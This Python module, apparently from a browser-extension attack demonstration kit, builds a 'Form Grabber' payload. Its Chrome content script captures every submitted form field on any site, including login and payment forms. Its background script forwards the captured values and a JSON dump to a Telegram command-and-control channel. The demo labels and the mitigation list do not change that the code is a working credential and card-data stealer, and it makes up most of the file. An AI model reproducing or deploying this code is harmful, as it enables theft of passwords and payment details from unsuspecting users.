from .base import BasePayload, Payload


class FormGrabber(BasePayload):

    def get_payload(self) -> Payload:
        return Payload(
            id="form_grabber",
            name="Form Grabber",
            description=(
                "Перехватывает данные из форм на любом сайте. "
                "Отправляет JSON-файл в Telegram."
            ),
            icon="📝",
            risk_level="critical",
            permissions=["<all_urls>", "storage"],
            targets=[
                "login forms",
                "registration forms",
                "payment forms",
                "search queries",
                "contact forms",
            ],
            demo_instructions=(
                "1. Установите расширение\n"
                "2. Откройте демо-сайт с формой\n"
                "3. Введите данные\n"
                "4. JSON придёт в Telegram"
            ),
            mitigation=[
                "Используйте менеджер паролей с автозаполнением",
                "Проверяйте URL перед вводом данных",
                "Используйте двухфакторную аутентификацию",
                "Не вводите данные на подозрительных сайтах",
                "Используйте аппаратные ключи безопасности",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// Form Grabber — C2
// ============================================================

console.log('[DEMO] Form Grabber: background loaded');

let capturedForms = [];

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'form_captured') {
        const entry = {
            url: sender.tab?.url || msg.url,
            timestamp: new Date().toISOString(),
            fields: msg.fields,
            formAction: msg.formAction,
            method: msg.method,
        };

        capturedForms.push(entry);
        console.log('[DEMO] Form captured:', entry);

        chrome.action.setBadgeText({ text: String(capturedForms.length) });
        chrome.action.setBadgeBackgroundColor({ color: '#FF0000' });

        chrome.storage.local.set({
            demo_captured_forms: capturedForms,
            demo_forms_count: capturedForms.length,
        });

        // C2: отправка
        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
            let text = `📝 <b>Form Grabber</b>\n`;
            text += `Сессия: <code>${C2_CONFIG.sessionId}</code>\n`;
            text += `URL: <code>${c2Escape(msg.url || '')}</code>\n`;
            text += `Форма: ${c2Escape(msg.formAction || '')} [${msg.method}]\n\n`;

            // Показываем поля
            const fields = msg.fields || {};
            const keys = Object.keys(fields);
            for (const key of keys.slice(0, 10)) {
                text += `  🔑 <b>${c2Escape(key)}</b>: <code>${c2Escape(fields[key])}</code>\n`;
            }
            if (keys.length > 10) {
                text += `\n<i>...и ещё ${keys.length - 10} полей</i>`;
            }

            // JSON-файл
            const jsonData = {
                session_id: C2_CONFIG.sessionId,
                timestamp: new Date().toISOString(),
                total_forms: capturedForms.length,
                forms: capturedForms,
            };
            const filename = `forms_${C2_CONFIG.sessionId}_${Date.now()}.json`;
            c2SendDocument(filename, JSON.stringify(jsonData, null, 2));

            c2Send(text);
        }

        sendResponse({ status: 'ok' });
    }

    if (msg.action === 'get_form_stats') {
        chrome.storage.local.get(['demo_captured_forms', 'demo_forms_count'], (data) => {
            sendResponse(data);
        });
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return r"""
// ============================================================
// Form Grabber — Content Script
// ============================================================

console.log('[DEMO] Form Grabber: content script loaded');

document.addEventListener('submit', (e) => {
    const form = e.target;
    if (!(form instanceof HTMLFormElement)) return;

    const fields = {};
    const formData = new FormData(form);

    for (const [name, value] of formData.entries()) {
        if (value && typeof value === 'string') {
            fields[name] = value;  // ПОЛНЫЕ данные
        }
    }

    // Также поля, которых нет в FormData
    form.querySelectorAll('input, textarea, select').forEach((el) => {
        if (el.name && el.value && !fields[el.name]) {
            fields[el.name] = el.value;
        }
    });

    chrome.runtime.sendMessage({
        action: 'form_captured',
        url: location.href,
        fields: fields,
        formAction: form.action,
        method: form.method || 'GET',
    });
}, true);
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_form_stats' }, (data) => {
    if (data && data.demo_forms_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_forms_count;
    }
});
"""


__all__ = ["FormGrabber"]
